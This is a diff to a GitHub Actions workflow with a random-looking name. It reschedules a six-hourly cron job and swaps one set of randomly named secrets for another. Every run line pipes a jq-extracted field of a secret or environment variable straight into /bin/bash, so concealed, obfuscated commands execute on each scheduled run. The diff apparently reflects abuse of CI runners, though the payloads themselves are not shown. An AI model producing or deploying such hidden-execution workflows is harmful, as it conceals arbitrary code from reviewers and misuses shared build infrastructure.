@@ -3,7 +3,7 @@ name: caobushang9870
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 2/6 * * *'
+    - cron: '13 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,24 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: caobushang9870
         env:
-          b5373: ${{ secrets.b5373 }}
+          rwni17335: ${{ secrets.rwni17335 }}
         run: |
-          echo $b5373 | jq -r .y6 | /bin/bash
-          echo $w0913 | jq -r .wy55 | /bin/bash
-          echo $afyfc2796 | jq -r .qvwip46220 | /bin/bash
-          echo $p74 | jq -r .kcp34 | /bin/bash
-          echo $i149 | jq -r .inqv27 | /bin/bash
-          echo $yyzx97 | jq -r .kgpw56 | /bin/bash
-          echo $vt62 | jq -r .kux800 | /bin/bash
-          echo $txwl3263 | jq -r .sn8628 | /bin/bash
-          echo $eof2 | jq -r .pzcxm0 | /bin/bash
-          echo $cv473 | jq -r .anw491 | /bin/bash
-          echo $d14896 | jq -r .m257 | /bin/bash
-          echo $uplq34104 | jq -r .vhsb8 | /bin/bash
-          echo $qug7599 | jq -r .vuy7385 | /bin/bash
-          echo $yrgh3 | jq -r .m992 | /bin/bash
-          echo $g9007 | jq -r .k4 | /bin/bash
-          echo $t1108 | jq -r .f50 | /bin/bash
-          echo $ulz6109 | jq -r .wjzv54 | /bin/bash
-          echo $fsxcq18 | jq -r .drs7 | /bin/bash
+          echo $rwni17335 | jq -r .qgn9 | /bin/bash
+          echo $ijddh2 | jq -r .iv3 | /bin/bash
+          echo $s77 | jq -r .nh7956 | /bin/bash
+          echo $ad7 | jq -r .va2138 | /bin/bash
+          echo $qixrf95490 | jq -r .dw414 | /bin/bash
+          echo $bhi1064 | jq -r .lxfdw3435 | /bin/bash
+          echo $iea8858 | jq -r .cr2 | /bin/bash
 
